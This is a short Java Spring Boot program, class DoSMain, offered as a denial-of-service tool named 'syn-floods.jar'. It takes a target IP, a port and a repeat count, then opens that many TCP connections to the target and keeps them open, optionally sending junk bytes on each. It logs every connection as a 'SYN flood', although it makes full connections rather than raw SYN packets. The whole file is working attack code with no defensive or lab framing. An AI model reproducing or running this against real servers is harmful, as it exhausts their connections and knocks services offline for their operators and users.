package com.example;


import java.io.OutputStream;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;

import org.springframework.boot.CommandLineRunner;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class DoSMain implements CommandLineRunner {


	public static void main(String[] args) {
		SpringApplication.run(DoSMain.class, args);
	}

	@Override
	public void run(String... args) throws Exception {
		
		if(args.length != 3) {
			System.out.println("Run with paramters: java -jar syn-floods.jar <IP> <Port> <Times>");
			System.out.println("                    <IP> - Server IP address");
			System.out.println("                    <Port> - Service Port");
			System.out.println("                    <Times> - attack times, like 2000, 10000");
			System.exit(0);
		}
		
		String ip = args[0];
		int port = Integer.parseInt(args[1]);
		int times = Integer.parseInt(args[2]);
		
		boolean isAttack = false;
		boolean isKeep = true;
		boolean isClose = false;
		List<Socket> list = new ArrayList<>();
		
		for (int i = 1 ; i <= times ; i ++) {
			
			SocketAddress address = new InetSocketAddress(ip, port);
			Socket socket = new Socket();
			socket.connect(address, 2000);
			
			if(isAttack) {
				OutputStream out = socket.getOutputStream();
				out.write("LOL is LOL".getBytes());
				out.flush();
			}
			
			if(isKeep) {
				list.add(socket);
			}
			
			if(isClose) {
				socket.close();
			}
			
			System.out.println("SYN flood " + i + "/" + times + ", " + socket.toString());
		}
		
		System.out.println("\nPress \"ENTER\" to continue...");
		Scanner scanner = new Scanner(System.in);
		scanner.nextLine();
		scanner.close();
		
	
		
	}

	
}
